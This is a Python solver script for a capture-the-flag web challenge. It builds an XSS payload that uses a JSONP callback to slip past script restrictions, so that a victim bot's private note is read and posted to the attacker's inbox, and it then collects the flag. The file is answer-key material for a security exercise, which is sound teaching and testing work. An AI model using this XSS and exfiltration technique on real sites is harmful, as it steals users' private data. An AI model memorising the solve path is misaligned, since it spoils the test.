#!/usr/bin/env python3
"""Course Finder solver: hand the assistant a link, read her note in the inbox."""

from __future__ import annotations

import argparse
import http.cookiejar
import re
import sys
import urllib.error
import urllib.parse
import urllib.request

STUDENT_USERNAME = "student"

FLAG = re.compile(r"ingehack\{[^}\r\n]+\}")

# Runs inside the assistant's browser. The endpoint wraps this text in
# `<callback>({...})`, so the trailing // comments the data out.
CALLBACK = (
    "fetch('/api/me/note')"
    ".then(r=>r.text())"
    ".then(t=>fetch('/api/inbox',{method:'POST',"
    "headers:{'Content-Type':'application/x-www-form-urlencoded'},"
    "body:'to=student&body='+encodeURIComponent(t)}))//"
)


class SolverError(RuntimeError):
    """The intended path did not produce a flag."""


def build_target_url(base_url: str) -> str:
    """The search URL whose query carries a same-origin script into her page."""
    callback = urllib.parse.quote(CALLBACK, safe="")
    payload = f'<script src="/api/jsonp?cb={callback}"></script>'
    return base_url + "/search?q=" + urllib.parse.quote(payload, safe="")


def sign_in(base_url: str) -> urllib.request.OpenerDirector:
    """Sign in as the player and return the opener that keeps the session cookie."""
    jar = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
    try:
        with opener.open(base_url + "/login", timeout=10) as response:
            page = response.read().decode("utf-8", "replace")
        match = re.search(r'data-pin-for="student">([^<]+)</code>', page)
        if not match:
            raise SolverError("the login page did not carry the student pass")
        body = urllib.parse.urlencode(
            {"username": STUDENT_USERNAME, "password": match.group(1)}
        ).encode()
        opener.open(base_url + "/login", body, timeout=10)
        with opener.open(base_url + "/inbox", timeout=10) as response:
            if response.geturl().endswith("/login"):
                raise SolverError("signing in as the student did not create a session")
    except urllib.error.URLError as error:
        raise SolverError(f"cannot sign in at {base_url}: {error}") from error
    return opener


def prepare(base_url: str) -> None:
    sign_in(base_url)
    print(build_target_url(base_url))


def submit(base_url: str) -> None:
    opener = sign_in(base_url)
    try:
        with opener.open(base_url + "/inbox", timeout=10) as response:
            body = response.read().decode("utf-8", "replace")
    except urllib.error.URLError as error:
        raise SolverError(f"cannot read the inbox: {error}") from error
    match = FLAG.search(body)
    if not match:
        raise SolverError("the note is not in the inbox yet")
    print(match.group(0))


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--base-url", required=True)
    parser.add_argument("--stage", choices=("prepare", "submit"))
    args = parser.parse_args()

    base_url = args.base_url.rstrip("/")
    try:
        if args.stage == "prepare":
            prepare(base_url)
        elif args.stage == "submit":
            submit(base_url)
        else:
            print("solver: pass --stage prepare or --stage submit", file=sys.stderr)
            return 2
    except SolverError as error:
        print(f"solver: {error}", file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
